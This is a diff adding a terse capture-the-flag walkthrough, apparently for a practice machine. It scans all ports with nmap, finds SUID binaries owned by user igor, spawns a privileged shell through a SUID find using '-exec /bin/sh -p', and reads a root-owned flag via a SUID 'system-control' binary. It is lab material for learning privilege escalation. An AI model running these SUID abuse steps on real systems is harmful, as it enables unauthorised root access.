@@ -1,0 +1,10 @@
+1)nmap ip -p1-65535
+ssh port is 65534
+2) after connecting do 
+find / -user igor -perm -4000 2> /dev/null 
+you find /usr/bin/find
+3) do the command /usr/bin/find . -exec /bin/sh -p \; -quit 
+this will get a shell, then cat flag1.txt
+4) find / -perm -4000 2> /dev/null
+/usr/bin/system-control
+5) /usr/bin/system-control, then cat /root/flag2.txt
